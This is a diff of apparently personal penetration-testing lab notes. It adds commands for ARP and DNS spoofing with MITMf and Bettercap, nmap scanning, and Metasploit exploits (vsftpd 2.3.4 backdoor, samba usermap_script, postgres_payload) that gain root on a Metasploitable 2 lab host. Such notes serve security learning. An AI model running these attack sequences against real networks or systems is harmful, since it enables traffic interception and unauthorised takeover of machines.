@@ -57,10 +57,108 @@ Start
 python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15
 ```
 
-# DNS Attack
+## DNS Attack
 
 
 
 ```console
-python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15
+python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15 --dns
 ```
+
+You can configure MITMF/config/mitmf.conf file to add dns info
+In \[\[\[A\]\]\]
+Use *.xxxx.com=10.0.2.10 to forward dns info to your own address.
+
+On your own kali, host Web server.
+
+
+
+
+## Bettercap
+
+bettercap is another man in the middle framework with constant update.
+
+```console
+bettercap
+```
+
+help to see all services.
+
+```console
+net.probe on 
+```
+
+Discover IP on the local network
+
+```console
+set arp.spoof.fullduplex true
+set arp.spoof.targets 10.0.2.15
+arp.spoof on
+```
+
+fullduplex: both targets and gateway will be attached, otherwise only target
+
+set target ip address
+
+Turn on arp.spoof
+
+Use net.sniff on to start sniffing packets
+
+# System penetrating
+
+Penetrate target systems
+
+## Metaexploitable 2
+
+Use nmap to scan target ports
+
+Zenmap options:
+1. Ping Scan
+2. Quick Scan
+3. Quick Scan Plus
+4. Intense Scan
+
+
+
+```console
+msfconsole
+```
+
+msf framework, built on Ruby.
+
+### Exploit vsftp 2.3.4
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+show options
+
+set RHOSTS 10.0.2.4
+
+exploit
+
+get root access
+
+
+### Exploit samba usermap_Script
+
+use exploit/multi/samba/usermap_script
+
+show options
+
+set RHOSTS 10.0.2.4
+
+exploit
+
+get root access
+
+use exploit/linux/postgres/postgres_payload
+
+
+show options
+
+set RHOSTS 10.0.2.4
+
+exploit
+
+get root access
+
